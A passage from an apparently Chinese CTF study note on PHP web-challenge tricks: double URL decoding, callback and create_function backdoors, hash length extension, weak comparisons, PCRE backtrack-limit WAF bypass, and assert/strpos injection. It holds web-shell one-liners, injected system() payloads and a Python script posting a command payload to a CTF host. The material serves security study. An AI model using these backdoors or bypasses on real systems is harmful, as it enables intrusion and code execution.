数组中。</li><li>示例：<code>/(hello) (world)/</code> 匹配 “hello world”，<code>matches[1]</code> 会是 “hello”，<code>matches[2]</code> 会是 “world”。</li></ul></li><li><strong>选择符 <code>|</code></strong>:<ul><li>用于匹配多个模式中的一个。</li><li>示例：<code>/cat|dog/</code> 匹配 “cat” 或 “dog”。</li></ul></li><li><strong>锚点</strong>:<ul><li><code>^</code> 匹配字符串的开头。</li><li><code>$</code> 匹配字符串的结尾。</li><li>示例：<code>/^hello/</code> 匹配 “hello” 仅当它出现在字符串的开头。</li><li><code>hello$/</code> 匹配 “hello” 仅当它出现在字符串的结尾。</li></ul></li><li><strong>零宽断言</strong>:<ul><li><strong>肯定先行断言</strong> <code>(?=...)</code>：匹配条件前面的位置，但不消耗字符。</li><li><strong>否定先行断言</strong> <code>(?!...)</code>：匹配条件前面的位置，并且不允许后面有特定内容。</li><li><strong>肯定后行断言</strong> <code>(?&lt;=...)</code>：匹配条件后面的位置。</li><li><strong>否定后行断言</strong> <code>(?&lt;!...)</code>：匹配条件后面的位置，但不允许前面有特定内容。</li></ul></li><li><strong>转义字符</strong>：<code>\</code> 用于转义字符，使其具有特殊含义。例如 <code>\d</code> 匹配任何数字，<code>\w</code> 匹配任何单词字符。</li><li><strong><code>(?R)?</code></strong>: 可选的递归匹配，用于处理嵌套函数调用。<code>?</code> 使得它变成可选的，以便处理最内层没有嵌套的函数调用。</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="11-urldecode-string-str-string"><a href="#11-urldecode-string-str-string" class="headerlink" title="(11) urldecode ( string $str ) : string"></a>(11) <code>urldecode ( string $str ) : string</code></h2><ul><li>解码已编码的 URL 字符串，因为发送请求的时候浏览器会自动进行一次解码，如果在代码中又执行 <code>urldecode</code> 就可能会存在绕过。例如：发送 <code>?id = 1%2527--》php接收到为$id=1%27</code> 如果在执行 <code>$id=urldecode($id)</code> ，最终 <code>$id=1&#39;</code></li></ul><h2 id="12-回调函数"><a href="#12-回调函数" class="headerlink" title="(12) 回调函数"></a>(12) 回调函数</h2><ul><li><p>回调函数是将一个函数作为参数传入另一个函数。由于可以将函数作为参数传入执行，将一些危险的函数作为参数传入，可能成为一个不易检测的后门。在 PHP 中有常用的回调函数：<code>call_user_func</code>、<code>call_user_func_array</code>、<code>array_map</code> 等。</p></li><li><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<br></code></pre></td></tr></table></figure><p><code>assert()</code> 函数直接作为回调函数，以 <code>$_REQUEST[&quot;pass&quot;]</code> 作为 <code>assert</code> 参数调用。</p></li></ul><h2 id="14-比较漏洞-hash-长度扩展攻击"><a href="#14-比较漏洞-hash-长度扩展攻击" class="headerlink" title="(14) 比较漏洞 - hash 长度扩展攻击"></a>(14) 比较漏洞 - hash 长度扩展攻击</h2><p>工具利用：HashPump&#x2F;Hexpand&#x2F;hash_extender</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 setup.py install  <span class="hljs-comment"># 安装Python绑定</span><br>hashpump -h <br></code></pre></td></tr></table></figure><p><strong>HashPump安装</strong>：</p><ol><li><code>git clone https://github.com/bwall/HashPump.git</code></li><li><code>apt-get install g++ libssl-dev</code></li><li><code>cd HashPump</code></li><li><code>make &amp;&amp; make install</code></li></ol><p><strong>利用条件</strong>：</p><ol><li>使用 <code>hash(key || message)</code> 这种方式，且使用了 MD5 或 SHA-1 等基于 Merkle–Damgård 构造的哈希函数生成哈希值；</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密钥；</li><li>服务器把提交的数据跟密钥构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值。</li></ol><p><strong>扩展</strong>：</p><ul><li>若长度未知，可进行爆破，参考：<a href="https://blog.csdn.net/qq1045553189/article/details/87566846">https://blog.csdn.net/qq1045553189/article/details/87566846</a></li></ul><h2 id="15-array-search"><a href="#15-array-search" class="headerlink" title="(15) array_search"></a>(15) <code>array_search</code></h2><ul><li>是弱类型比较，这意味着在某些情况下，PHP 会将字符串与数字进行比较时转换为相同的类型。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br></code></pre></td></tr></table></figure><ul><li>PHP 会把 <code>DGGJ</code> 转为 <code>0</code>，<code>d === false ? die(&quot;no...&quot;) : NULL;</code>，此时查找的就是 <code>0</code> 在数组里的位置了。我们可以把 <code>0</code> 放在索引为 <code>1</code> 的地方，这样 <code>1 === false</code> 不成立。</li></ul><h2 id="16-create-function"><a href="#16-create-function" class="headerlink" title="(16) create_function"></a>(16) <code>create_function</code></h2><ul><li>代码注入</li><li>从 PHP 7.2.0 开始被标记为已弃用，并在 PHP 8.0.0 中被移除。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return $a+$b;&#x27;</span>);<br><span class="hljs-comment">// 等同于</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#125;eval($_POST[&quot;cmd&quot;]);//&#x27;</span>);<br><span class="hljs-comment">// 等同于</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="17-通过构造动态调用函数"><a href="#17-通过构造动态调用函数" class="headerlink" title="(17) 通过构造动态调用函数"></a>(17) 通过构造动态调用函数</h2><ul><li>例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;)<br></code></pre></td></tr></table></figure></li><li>分析：<ul><li><code>$pi = hex2bin(&quot;5f474554&quot;) =&gt; _GET</code></li><li>$$pi 取出真正的 <code>_GET</code> 数组，$p 得到的 <code>_GET</code> 只是字符串；因为 <code>[]</code> 被禁了就用 <code>&#123;&#125;</code> 代替，最后的得：</li><li><code>(_GET)&#123;pi&#125;((_GET)&#123;abs&#125;)</code></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) === <span class="hljs-string">&quot;I have a dream&quot;</span>) &#123;<br></code></pre></td></tr></table></figure><h2 id="18-使用-file-get-contents-file"><a href="#18-使用-file-get-contents-file" class="headerlink" title="(18) 使用  file_get_contents($file)"></a>(18) 使用  file_get_contents($file)</h2><ul><li>用 &#96;file_get</li></ul><p>_contents(‘php:&#x2F;&#x2F;input’)<code>来读取原始</code>POST<code>数据，而不是</code>$_POST&#96; 键值对。</p><p>  例如，如果你发送的是 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code>，则 <code>php://input</code> 会读取整个 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code> 作为字符串。</p><h2 id="19-pcre-回溯"><a href="#19-pcre-回溯" class="headerlink" title="(19) pcre 回溯"></a>(19) <code>pcre</code> 回溯</h2><ul><li>假设要匹配的正则是 <code>&lt;\?.\*[(</code>;?&gt;].*<code>，输入是 </code>&lt;?php phpinfo();&#x2F;&#x2F;aaaaa&#96;。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;Br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>正则的 <code>&lt;</code> 匹配了输入的 <code>&lt;</code>。当前匹配成功则读取下一个字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>?</code> 也匹配成功，继续。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>.*</code> 会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>发现输入已经没东西匹配了。此时 NFA 开始回溯，回退之前匹配的字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaa</span><br></code></pre></td></tr></table></figure><ul><li>回退出来的字符 <code>a</code> 仍然无法匹配 <code>[(</code>;?&gt;]&#96;。继续回溯。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaa</span><br></code></pre></td></tr></table></figure><ul><li>回溯这一步骤会重复执行，直到回溯到下面的状态。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure><ul><li>这一步回溯回退出来的字符是 <code>;</code>，匹配正则表达式 <code>[(</code>;?&gt;]&#96;。便停止回溯，匹配上字符。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><ul><li>最后的一个正则表达式匹配完接下来的所有内容。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>完全匹配成功，返回 <code>true</code>。如果我们数一下，会发现回溯次数为 <code>8</code>，而回溯次数是有上限的，默认是 <code>100</code> 万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回 <code>false</code>。但这个 <code>false</code> 可以被强制转换。</li></ul><p>例如下面的 WAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = 1 UNION &quot;</span> . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;/*!A*/ &quot;</span>, <span class="hljs-number">10000</span>) . <span class="hljs-string">&quot;SELECT name, email FROM users;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No SQL Injection detected.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以利用 <code>pcre</code> 的回溯次数限制绕过。</li></ul><p>但是下面的 WAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用了 <code>===</code> 强等于，<code>PREG_BACKTRACK_LIMIT_ERROR</code> 不等于 <code>0</code>。利用这一特点，我们可以在 <code>payload</code> 末尾加一堆 <code>a</code>，使其超过回溯限制。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>res = requests.post(<span class="hljs-string">&quot;http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-comment">#print(payload)</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="20-json-decode-json-true-cmd"><a href="#20-json-decode-json-true-cmd" class="headerlink" title="(20) json_decode($json, true)[&#39;cmd&#39;];"></a>(20) <code>json_decode($json, true)[&#39;cmd&#39;];</code></h2><ul><li><code>json_decode()</code> 是一个用于将 JSON 格式的字符串转换为 PHP 数据结构（数组或对象）的函数。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$json</span> = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;echo hello&quot;, &quot;user&quot;: &quot;admin&quot;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code>json_decode($json, true)</code> 将 JSON 字符串解析为 PHP 关联数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">// $array 现在等于：[&quot;cmd&quot; =&gt; &quot;echo hello&quot;, &quot;user&quot; =&gt; &quot;admin&quot;]</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$array</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-comment">// $command 现在等于 &quot;echo hello&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><code>json_decode($json, false)</code> 将 JSON 字符串解析为一个 PHP 对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// $object 现在是一个对象，其属性如下：</span><br><span class="hljs-comment">// $object-&gt;cmd = &quot;echo hello&quot;</span><br><span class="hljs-comment">// $object-&gt;user = &quot;admin&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="21-assert-注入"><a href="#21-assert-注入" class="headerlink" title="(21) assert 注入"></a>(21) <code>assert</code> 注入</h2><ul><li><code>assert(&quot;intval($_GET[num])==1919810&quot;)</code></li><li><code>assert</code> 里面直接把我们的输入拼接进去了 <code>?num=114514)==114514;//</code></li></ul><h2 id="22-strstr"><a href="#22-strstr" class="headerlink" title="(22) strstr()"></a>(22) <code>strstr()</code></h2><ul><li><p>搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 <code>FALSE</code>。</p></li><li><p>语法：<code>strstr(string, search, before_search)</code></p></li><li><p><code>string</code>: 必需。规定被搜索的字符串。</p></li><li><p><code>search</code>: 必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</p></li><li><p><code>before_search</code>: 可选。一个默认值为 <code>false</code> 的布尔值。如果设置为 <code>true</code>，它将返回 <code>search</code> 参数第一次出现之前的字符串部分。</p></li><li><p>注意这个函数是大小写敏感的。这里可以用 <code>PHP://</code> 绕过，也可以考虑另外一个 PHP 伪协议：<code>data://</code></p></li></ul><h2 id="23-mb-substr"><a href="#23-mb-substr" class="headerlink" title="(23) mb_substr()"></a>(23) <code>mb_substr()</code></h2><ul><li><p>返回字符串的一部分，中文字符也可以使用。<code>substr()</code> 只针对英文字符</p></li><li><p>语法：<code>mb_substr(字符串, 起始, 长度, 编码)</code>，其中长度和编码可选。</p></li><li><p>将土耳其语中的 “İstanbul” 转换为小写时，可能输出带点的 “i”（”i̇stanbul”）</p></li></ul><h2 id="24-mb-strpos"><a href="#24-mb-strpos" class="headerlink" title="(24) mb_strpos()"></a>(24) <code>mb_strpos()</code></h2><ul><li><p>返回要查找的字符串在别一个字符串中首次出现的位置</p></li><li><p>语法：<code>mb_strpos (字符串, 要搜索的字符串)</code></p></li><li><p>因为 <code>mb_strpos()</code> 只会返回首次出现的位置，所以如果我们传类似于 <code>hint.php?想要查看的文件路径</code> 这样的 <code>payload</code> 的话，切割的结果是 <code>hint.php</code>，通过了过滤。问题是过滤通过了后这个 <code>payload</code> 根本就不是一个有效的文件名。</p></li><li><p>不急，<code>include</code> 有一个很有趣的特性：</p><ul><li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件。</li><li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li></ul></li></ul><h2 id="24-文件存在"><a href="#24-文件存在" class="headerlink" title="(24) 文件存在"></a>(24) 文件存在</h2><ul><li><p><code>file_exists()</code> 返回布尔值：</p><ul><li>如果文件存在，则返回 <code>TRUE</code></li><li>如果文件不存在，则返回 <code>FALSE</code></li></ul><p>与其他相关函数不同的是：</p><ul><li><code>is_file($filename)</code> 仅检查文件是否存在，并且必须是一个文件，而不是目录。</li><li><code>is_dir($filename)</code> 检查是否存在一个目录，哪怕它是空的。</li></ul></li></ul><h2 id="25-strpos"><a href="#25-strpos" class="headerlink" title="(25) strpos"></a>(25) <code>strpos</code></h2><ul><li>查找字符串在另一字符串中第一次出现的位置（区分大小写），如果没有找到字符串则返回 <code>FALSE</code>。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">templates/<span class="hljs-string">&#x27;.system(&#x27;</span>cat+./templates/flag.php<span class="hljs-string">&#x27;).&#x27;</span>.php<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;templates/&#x27;.system(&#x27;cat+./templates/flag.php&#x27;).&#x27;.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="逻辑漏洞绕过"><a href="#逻辑漏洞绕过" class="headerlink" title="逻辑漏洞绕过"></a>逻辑漏洞绕过</h2><ul><li>源码如下：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v2</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v3</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;foo&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>))&#123;<br>   <span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])&#123;<br>       (<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>]&gt;<span class="hljs-number">2021</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>]))&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>])!==<br><br><span class="hljs-number">5</span> OR !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>       <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;me7e&quot;</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a2&quot;</span>]);<br>       <span class="hljs-variable">$pos</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>           <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;me7e&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       &#125;<br>       <span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dog&#x27;</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>])&#123;<br>   <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>)&#123;<br>       <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;3|1|c&quot;</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-title function_ invoke__">strpos</span>((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">&quot;me7e2021&quot;</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> &amp;&amp; <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-variable">$v3</span>)<br>&#123;<br>   <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag13</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>第一层</strong>： 需要传入一个不是数字但是大于 2021 的参数，根据弱比较可以让 <code>bar1=2022asd</code></p></li><li><p><strong>第二层</strong>: <code>bar2</code> 有 5 个元素，并且第一个是数组，让 <code>bar2=[[0],2,3,4,5]</code>，通过弱比较绕过 <code>array_search</code> 的搜索 